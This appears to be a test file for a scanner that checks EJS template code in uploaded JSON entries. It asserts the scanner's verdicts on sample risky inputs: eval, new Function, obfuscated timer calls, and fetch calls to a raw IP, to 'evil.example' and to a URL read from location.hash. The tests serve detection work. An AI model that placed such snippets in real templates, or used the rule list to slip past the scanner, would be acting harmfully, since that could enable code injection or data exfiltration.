import assert from "node:assert/strict";
import test from "node:test";
import { analyzeProjectCodeV2 } from "../src/index.mjs";

function report(content) {
  return analyzeProjectCodeV2([
    {
      fileName: "rules.json",
      type: "worldbook",
      text: JSON.stringify({ entries: [{ uid: 1, name: "Entry", content }] }),
    },
  ]);
}

function has(result, ruleId) {
  return result.findings.some((finding) => finding.ruleId === ruleId);
}

test("plain content is accepted and green", () => {
  const result = report("plain text");
  assert.equal(result.gate, "accept");
  assert.equal(result.audit, "green");
  assert.equal(result.certification, "pass");
});

test("high rule families are visible without changing the L-gate", () => {
  for (const [content, ruleId, certification] of [
    ['<% eval("1") %>', "M1", "fail"],
    ['<% new Function("return 1") %>', "M2", "fail"],
    ['<% fetch("http://1.2.3.4/x") %>', "M4", "review"],
    ["<% while(true){} %>", "M5", "fail"],
    ['<% atob("YQ==") %>', "AH1", "pass"],
    ['<% document.createElement("script") %>', "AH4", "pass"],
  ]) {
    const result = report(content);
    assert.equal(result.gate, "accept", `${ruleId} must not trigger the L-gate`);
    assert.equal(has(result, ruleId), true, `${ruleId} missing: ${JSON.stringify(result.findings)}`);
    assert.equal(result.certification, certification);
  }
});

test("API catalogue warns on missing await and arguments", () => {
  const missingAwait = report('<% getwi("entry").length; %>');
  assert.equal(has(missingAwait, "API1"), true, JSON.stringify(missingAwait.findings));
  const missingArgs = report("<% getwi(); %>");
  assert.equal(has(missingArgs, "API2"), true, JSON.stringify(missingArgs.findings));
  const correct = report('<% const x = (await getwi("entry")).length; %>');
  assert.equal(has(correct, "API1") || has(correct, "API2"), false);
});

test("URL and dynamic capability families remain visible", () => {
  const cases = [
    ['<% fetch("https://evil.example/x") %>', "U2"],
    ['<% fetch("http://1.2.3.4/x") %>', "U4"],
    ["<% const u = location.hash; fetch(u) %>", "U5"],
    ['<% globalThis["set"+"Timeout"]("1") %>', "AH2"],
    ['<% "<%".replace("%>", "") %>', "AH3"],
  ];
  for (const [content, ruleId] of cases) {
    const result = report(content);
    assert.equal(has(result, ruleId), true, `${ruleId} missing: ${JSON.stringify(result.findings)}`);
  }
});

test("L1-L7 high findings reject the upload", () => {
  const result = report("<% function exposed(){} %>");
  assert.equal(result.gate, "reject");
  assert.equal(result.audit, "not_applicable");
  assert.equal(result.certification, "fail");
  assert.equal(
    result.findings.some((finding) => /^L[1-7]$/.test(finding.ruleId)),
    true,
  );
});

test("EJS parse errors are high but not an L-gate rejection", () => {
  const result = report("<% if( %>");
  assert.equal(result.gate, "accept");
  assert.equal(result.certification, "fail");
  assert.equal(has(result, "EJS-PARSE"), true);
});
